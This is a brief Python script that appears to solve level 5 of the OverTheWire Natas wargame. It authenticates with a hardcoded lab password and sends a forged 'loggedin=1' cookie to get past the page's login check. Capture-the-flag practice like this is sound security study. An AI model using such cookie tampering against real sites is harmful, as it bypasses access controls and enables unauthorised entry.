#!/usr/bin/env python

import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = f'http://{username}.natas.labs.overthewire.org/'
cookies = {'loggedin': '1'}

session = requests.Session()
response = session.get(url, auth=(username, password), cookies=cookies)
# response = session.get(url, auth=(username, password))
content = response.text
output = open('output.html', 'w')
output.write(content)

print(content)
# print(session.cookies['loggedin'])

# HTTP Headers & Cookies
